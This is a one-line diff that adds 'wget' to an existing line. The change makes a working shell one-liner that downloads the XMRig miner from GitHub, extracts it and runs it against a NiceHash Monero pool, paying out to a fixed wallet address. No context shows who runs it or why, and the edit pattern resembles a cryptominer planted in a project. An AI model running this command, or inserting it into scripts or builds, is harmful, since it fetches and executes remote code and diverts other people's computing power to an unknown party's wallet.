@@ -1,1 +1,1 @@
-https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz&&tar -xf xmrig-6.18.1-linux-x64.tar.gz&&cd xmrig-6.18.1&&./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbSUsDP1pvNBRvje2d2qYCsHQoYC8stMi1A -p x -k --nicehash -a rx/0
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz&&tar -xf xmrig-6.18.1-linux-x64.tar.gz&&cd xmrig-6.18.1&&./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbSUsDP1pvNBRvje2d2qYCsHQoYC8stMi1A -p x -k --nicehash -a rx/0
